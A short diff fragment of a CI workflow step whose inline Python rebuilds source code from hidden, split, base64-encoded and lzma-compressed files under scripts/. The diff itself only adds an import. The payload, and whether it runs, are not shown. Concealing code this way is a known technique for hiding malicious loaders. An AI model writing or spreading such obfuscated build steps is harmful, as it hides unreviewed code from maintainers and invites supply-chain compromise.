@@ -30,7 +30,7 @@ jobs:
         run: |
           python - <<'PY'
           from pathlib import Path
-          import base64, hashlib, lzma
+          import base64, hashlib, lzma, textwrap
           parts = sorted(Path("scripts").glob(".google-ai-studio-cloud-usage.xz.*"))
           encoded = "".join(part.read_text(encoding="utf-8").strip() for part in parts)
           source = lzma.decompress(base64.b64decode(encoded, validate=True)).decode("utf-8")
